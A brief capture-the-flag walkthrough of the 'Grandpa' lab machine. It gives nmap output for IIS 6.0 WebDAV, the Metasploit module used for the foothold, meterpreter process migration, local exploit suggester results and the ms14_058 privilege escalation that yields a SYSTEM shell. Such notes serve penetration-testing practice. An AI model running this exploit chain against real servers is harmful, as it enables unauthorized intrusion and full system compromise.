# Notes For Grandpa
# -Foothold
## Nmap Scan Results
```bash
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Wed, 07 Apr 2021 20:05:57 GMT
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Exploit
```text
msf > use exploit/windows/iis/iis\_webdav\_scstoragepathfromurl
```

# -Root
## Migrate Process
```batch
meterpreter > ps

Process List
============

 PID   PPID  Name              Arch  Session  User                         Path
 ---   ----  ----              ----  -------  ----                         ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 324   272   csrss.exe
 348   272   winlogon.exe
 372   1084  cidaemon.exe
 396   348   services.exe
 408   348   lsass.exe
 612   396   svchost.exe
 680   396   svchost.exe
 736   396   svchost.exe
 760   1084  cidaemon.exe
 772   396   svchost.exe
 800   396   svchost.exe
 904   1084  cidaemon.exe
 936   396   spoolsv.exe
 964   396   msdtc.exe
 1084  396   cisvc.exe
 1124  396   svchost.exe
 1180  396   inetinfo.exe
 1216  396   svchost.exe
 1328  396   VGAuthService.ex
             e
 1408  396   vmtoolsd.exe
 1456  396   svchost.exe
 1636  396   alg.exe
 1660  396   svchost.exe
 1832  612   wmiprvse.exe      x86   0        NT AUTHORITY\NETWORK SERVIC  C:\WINDOWS\system32\wbem\wm
                                              E                            iprvse.exe
 1912  396   dllhost.exe
 2308  612   wmiprvse.exe
 2792  348   logon.scr
 3120  1456  w3wp.exe          x86   0        NT AUTHORITY\NETWORK SERVIC  c:\windows\system32\inetsrv
                                              E                            \w3wp.exe
 3192  612   davcdata.exe      x86   0        NT AUTHORITY\NETWORK SERVIC  C:\WINDOWS\system32\inetsrv
                                              E                            \davcdata.exe
 3396  3120  rundll32.exe      x86   0                                     C:\WINDOWS\system32\rundll3
                                                                           2.exe
```

```text
msf > migrate 1832
```
## Local Exploit Suggester
```text
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 37 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

## Exploit
```text
msf > use exploit/windows/local/ms14_058_track_popup_menu
```

```batch
whoami
nt authority\system
```